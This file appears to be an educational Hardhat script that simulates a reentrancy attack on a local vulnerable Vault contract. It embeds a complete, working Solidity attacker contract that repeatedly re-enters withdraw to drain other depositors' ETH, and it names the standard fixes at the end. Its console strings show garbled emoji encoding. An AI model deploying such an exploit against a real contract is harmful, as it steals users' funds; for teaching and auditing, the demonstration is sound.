import { ethers } from "hardhat";

// Attacker contract that exploits the reentrancy vulnerability
const ATTACKER_CONTRACT = `
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

interface IVault {
    function deposit() external payable;
    function withdraw(uint256 amount) external;
    function getBalance(address user) external view returns (uint256);
}

contract VaultAttacker {
    IVault public vault;
    address public owner;
    uint256 public attackAmount;
    uint256 public attackCount;
    uint256 public maxAttacks = 5;
    
    event AttackStarted(uint256 amount);
    event ReentrancyCall(uint256 callNumber, uint256 contractBalance);
    event AttackCompleted(uint256 totalStolen);
    
    constructor(address _vault) {
        vault = IVault(_vault);
        owner = msg.sender;
    }
    
    modifier onlyOwner() {
        require(msg.sender == owner, "Not owner");
        _;
    }
    
    // Step 1: Deposit some funds to establish a balance
    function depositToVault() external payable onlyOwner {
        require(msg.value > 0, "Must send ETH");
        vault.deposit{value: msg.value}();
    }
    
    // Step 2: Start the reentrancy attack
    function attack() external onlyOwner {
        uint256 vaultBalance = address(vault).balance;
        require(vaultBalance > 0, "Vault is empty");
        
        // Attack with our deposited amount
        attackAmount = vault.getBalance(address(this));
        require(attackAmount > 0, "No balance to withdraw");
        
        attackCount = 0;
        emit AttackStarted(attackAmount);
        
        // Initiate the attack
        vault.withdraw(attackAmount);
    }
    
    // This function will be called by the vault during withdrawal
    // Due to the reentrancy vulnerability, we can call withdraw again
    receive() external payable {
        attackCount++;
        uint256 vaultBalance = address(vault).balance;
        
        emit ReentrancyCall(attackCount, vaultBalance);
        
        // Continue the attack if vault has funds and we haven't exceeded max attacks
        if (vaultBalance >= attackAmount && attackCount < maxAttacks) {
            vault.withdraw(attackAmount);
        } else {
            emit AttackCompleted(address(this).balance);
        }
    }
    
    // Withdraw stolen funds
    function withdrawStolenFunds() external onlyOwner {
        payable(owner).transfer(address(this).balance);
    }
    
    // Get contract balance
    function getBalance() external view returns (uint256) {
        return address(this).balance;
    }
}
`;

async function main() {
  console.log("üö® REENTRANCY ATTACK DEMONSTRATION");
  console.log("===================================");
  console.log("‚ö†Ô∏è  WARNING: This is for educational purposes only!");
  console.log("");

  const [deployer, victim1, victim2, attacker] = await ethers.getSigners();
  
  console.log("üë• Setting up accounts:");
  console.log("  Deployer:", deployer.address);
  console.log("  Victim 1:", victim1.address);
  console.log("  Victim 2:", victim2.address);
  console.log("  Attacker:", attacker.address);
  console.log("");

  // Deploy the vulnerable vault
  console.log("üèóÔ∏è  Deploying vulnerable Vault contract...");
  const Vault = await ethers.getContractFactory("Vault");
  const vault = await Vault.deploy();
  await vault.waitForDeployment();
  const vaultAddress = await vault.getAddress();
  console.log("‚úÖ Vault deployed at:", vaultAddress);

  // Victims deposit funds
  console.log("\nüí∞ Victims depositing funds to vault...");
  
  const depositAmount = ethers.parseEther("2.0");
  await vault.connect(victim1).deposit({ value: depositAmount });
  console.log("  Victim 1 deposited:", ethers.formatEther(depositAmount), "ETH");
  
  await vault.connect(victim2).deposit({ value: depositAmount });
  console.log("  Victim 2 deposited:", ethers.formatEther(depositAmount), "ETH");

  const initialVaultBalance = await vault.getContractBalance();
  console.log("  Total vault balance:", ethers.formatEther(initialVaultBalance), "ETH");

  // Deploy attacker contract
  console.log("\nüî¥ Deploying attacker contract...");
  
  // Create a temporary file for the attacker contract
  const fs = require("fs");
  const attackerPath = "contracts/VaultAttacker.sol";
  fs.writeFileSync(attackerPath, ATTACKER_CONTRACT);
  
  // Compile and deploy
  await hre.run("compile");
  const VaultAttacker = await ethers.getContractFactory("VaultAttacker");
  const attackerContract = await VaultAttacker.connect(attacker).deploy(vaultAddress);
  await attackerContract.waitForDeployment();
  const attackerAddress = await attackerContract.getAddress();
  console.log("‚úÖ Attacker contract deployed at:", attackerAddress);

  // Attacker deposits initial funds
  console.log("\nüéØ Attacker deposits initial funds...");
  const attackerDeposit = ethers.parseEther("1.0");
  await attackerContract.connect(attacker).depositToVault({ value: attackerDeposit });
  console.log("  Attacker deposited:", ethers.formatEther(attackerDeposit), "ETH");

  const preAttackVaultBalance = await vault.getContractBalance();
  const preAttackAttackerBalance = await ethers.provider.getBalance(attacker.address);
  
  console.log("\nüìä Pre-attack state:");
  console.log("  Vault balance:", ethers.formatEther(preAttackVaultBalance), "ETH");
  console.log("  Attacker ETH balance:", ethers.formatEther(preAttackAttackerBalance), "ETH");

  // Execute the attack
  console.log("\nüö® EXECUTING REENTRANCY ATTACK...");
  console.log("=====================================");
  
  const attackTx = await attackerContract.connect(attacker).attack();
  const receipt = await attackTx.wait();
  
  // Parse events to show the attack in detail
  console.log("\nüìã Attack events:");
  for (const log of receipt?.logs || []) {
    try {
      const parsed = attackerContract.interface.parseLog(log);
      if (parsed) {
        switch (parsed.name) {
          case "AttackStarted":
            console.log(`  üéØ Attack started with amount: ${ethers.formatEther(parsed.args.amount)} ETH`);
            break;
          case "ReentrancyCall":
            console.log(`    üîÑ Reentrancy call #${parsed.args.callNumber}, vault balance: ${ethers.formatEther(parsed.args.contractBalance)} ETH`);
            break;
          case "AttackCompleted":
            console.log(`  ‚úÖ Attack completed, total stolen: ${ethers.formatEther(parsed.args.totalStolen)} ETH`);
            break;
        }
      }
    } catch (e) {
      // Ignore parsing errors for other contracts' events
    }
  }

  // Show post-attack state
  const postAttackVaultBalance = await vault.getContractBalance();
  const postAttackAttackerContractBalance = await attackerContract.getBalance();
  
  console.log("\nüìä Post-attack state:");
  console.log("  Vault balance:", ethers.formatEther(postAttackVaultBalance), "ETH");
  console.log("  Attacker contract balance:", ethers.formatEther(postAttackAttackerContractBalance), "ETH");
  
  const stolenAmount = preAttackVaultBalance - postAttackVaultBalance;
  console.log("\nüí∏ ATTACK SUMMARY:");
  console.log("  Amount stolen:", ethers.formatEther(stolenAmount), "ETH");
  console.log("  Attack success rate:", `${Math.round((Number(stolenAmount) / Number(preAttackVaultBalance)) * 100)}%`);

  // Withdraw stolen funds
  console.log("\nüí∞ Attacker withdrawing stolen funds...");
  await attackerContract.connect(attacker).withdrawStolenFunds();
  
  const finalAttackerBalance = await ethers.provider.getBalance(attacker.address);
  console.log("  Attacker final balance:", ethers.formatEther(finalAttackerBalance), "ETH");
  
  // Clean up
  fs.unlinkSync(attackerPath);
  
  console.log("\nüîö DEMONSTRATION COMPLETE");
  console.log("=========================");
  console.log("‚ö†Ô∏è  This attack was possible due to the reentrancy vulnerability in the withdraw function.");
  console.log("üõ°Ô∏è  The fix involves using the Checks-Effects-Interactions pattern or ReentrancyGuard.");
}

main().catch((error) => {
  console.error("‚ùå Attack simulation failed:", error);
  process.exitCode = 1;
});